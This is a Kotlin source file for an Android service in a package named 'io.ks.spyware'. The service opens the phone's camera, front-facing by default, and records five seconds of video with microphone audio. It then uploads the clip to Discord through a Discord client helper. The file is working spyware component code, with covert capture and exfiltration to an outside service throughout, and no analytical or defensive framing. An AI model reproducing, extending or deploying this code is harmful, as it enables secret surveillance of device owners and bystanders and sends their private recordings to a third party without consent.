package io.ks.spyware

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.media.MediaRecorder
import android.net.Uri
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import io.ks.spyware.AudioRecording.Companion.lastRecordedFileUri
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

@Suppress("DEPRECATION")
class CamRecording : Service() {

    private var mediaRecorder: MediaRecorder? = null
    private var cameraDevice: CameraDevice? = null
    private var videoFile: File? = null
    private var isRecording = false
    private lateinit var cameraManager: CameraManager
    private val stopHandler = Handler(Looper.getMainLooper())

    companion object {
        private const val CHANNEL_ID = "VideoRecorderChannel"
        private const val NOTIFICATION_ID = 1
    }

    @SuppressLint("ForegroundServiceType")
    override fun onCreate() {
        super.onCreate()
        cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val cameraId = intent?.getStringExtra("cameraId") ?: "1"
        startRecording(cameraId)
        return START_STICKY
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(CHANNEL_ID, "Video Recorder Service", NotificationManager.IMPORTANCE_DEFAULT)
            .apply { lightColor = Color.BLUE }
        (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(channel)
    }

    private fun createNotification(): Notification {
        val notificationIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE)
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Video Recording Service")
            .setContentText("Recording in background")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setContentIntent(pendingIntent)
            .build()
    }

    private fun startRecording(cameraId: String) {
        if (isRecording) return

        try {
            setupMediaRecorder(cameraId)
            openCamera(cameraId)
        } catch (e: Exception) {
            Log.e("VideoRecording", "Error starting recording: ${e.message}")
        }
    }

    private fun setupMediaRecorder(cameraId: String) {
        videoFile = createVideoFile()
        mediaRecorder = MediaRecorder().apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setVideoSource(MediaRecorder.VideoSource.SURFACE)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            setVideoEncoder(MediaRecorder.VideoEncoder.H264)
            setVideoSize(1920, 1080)
            setOutputFile(videoFile?.absolutePath)

            try {
                prepare()
            } catch (e: Exception) {
                Log.e("VideoRecording", "Error preparing MediaRecorder: ${e.message}")
            }
            Log.d("VideoRecording", "Video will be saved at: ${videoFile?.absolutePath}")
        }
    }

    private fun createVideoFile(): File {
        val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
        val storageDir = File(getExternalFilesDir(null), "videos").apply { if (!exists()) mkdirs() }
        return File(storageDir, "VIDEO_$timeStamp.mp4")
    }

    private fun openCamera(cameraId: String) {
        try {
            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    createCaptureSession()
                }
                override fun onDisconnected(camera: CameraDevice) { camera.close() }
                override fun onError(camera: CameraDevice, error: Int) { camera.close() }
            }, null)
        } catch (e: SecurityException) {
            Log.e("VideoRecording", "Error opening camera: ${e.message}")
        }
    }

    private fun createCaptureSession() {
        val surface = mediaRecorder?.surface ?: return
        cameraDevice?.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
            override fun onConfigured(session: CameraCaptureSession) {
                session.setRepeatingRequest(
                    cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_RECORD)
                        ?.apply { addTarget(surface) }
                        ?.build()!!, null, null)
                mediaRecorder?.start()
                isRecording = true
                stopHandler.postDelayed({ stopRecording() }, 5000L)
            }

            override fun onConfigureFailed(session: CameraCaptureSession) {
                Log.e("VideoRecording", "Failed to configure camera capture session")
            }
        }, null)
    }

    private fun stopRecording() {
        if (!isRecording) return

        try {
            cameraDevice?.close()
            mediaRecorder?.apply {
                stop()
                reset()
                release()
            }
        } catch (e: Exception) {
            Log.e("VideoRecording", "Error stopping recording: ${e.message}")
        } finally {
            isRecording = false
            stopSelf()
            DiscordClientManager.discordClient?.sendDiscordFileMessage(this,"Video Recording", Uri.fromFile(videoFile))
        }
    }

    override fun onDestroy() {
        stopRecording()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

}